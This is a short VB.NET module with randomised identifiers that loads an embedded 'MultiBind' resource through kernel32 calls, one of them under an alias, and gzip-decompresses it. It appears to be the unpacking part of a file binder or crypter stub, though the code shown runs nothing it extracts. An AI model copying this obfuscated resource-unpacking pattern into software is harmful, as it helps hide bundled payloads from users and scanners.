Imports System.Runtime.InteropServices
Imports System.IO
Imports System.IO.Compression

Module DtXErddcUVsV
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function FindResource(ByVal CvQfufuMNvCq As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
    End Function
    Private Declare Function qHtvrsgOFKQL Lib "kernel32" Alias "GetModuleHandleA" (ByVal moduleName As String) As IntPtr
    Private Declare Function SizeofResource Lib "kernel32" (ByVal CvQfufuMNvCq As IntPtr, ByVal hResInfo As IntPtr) As Integer
    Private Declare Function LoadResource Lib "kernel32" (ByVal CvQfufuMNvCq As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
    Public Function znKEdivzxWDV(ByVal aZEEXIquKhRh As String, ByVal N As Integer) As Byte()
        Dim CvQfufuMNvCq As IntPtr = qHtvrsgOFKQL(aZEEXIquKhRh)
        Dim wWFwZldokHN As IntPtr = FindResource(CvQfufuMNvCq, N, "MultiBind")
        Dim shOphqUnyXvI As IntPtr = LoadResource(CvQfufuMNvCq, wWFwZldokHN)
        Dim SSHpaPPiKiJT = SizeofResource(CvQfufuMNvCq, wWFwZldokHN)
        Dim voUQymTANwuc As Byte() = New Byte(SSHpaPPiKiJT - 1) {}
        Marshal.Copy(shOphqUnyXvI, voUQymTANwuc, 0, CInt(SSHpaPPiKiJT))
        Return voUQymTANwuc
    End Function


    Public Function Decompress(ByVal bytData() As Byte) As Byte()
        Using oMS As New MemoryStream(bytData)
            Using oGZipStream As New GZipStream(oMS, CompressionMode.Decompress)
                Const CHUNK As Integer = 1024
                Dim intTotalBytesRead As Integer = 0
                Do
                    ReDim Preserve bytData(intTotalBytesRead + CHUNK - 1)
                    Dim intBytesRead As Integer = oGZipStream.Read(bytData, intTotalBytesRead, CHUNK)
                    intTotalBytesRead += intBytesRead
                    If intBytesRead < CHUNK Then
                        ReDim Preserve bytData(intTotalBytesRead - 1)
                        Exit Do
                    End If
                Loop
                oGZipStream.Close()
            End Using
            oMS.Close()
        End Using
        Return bytData
    End Function
End Module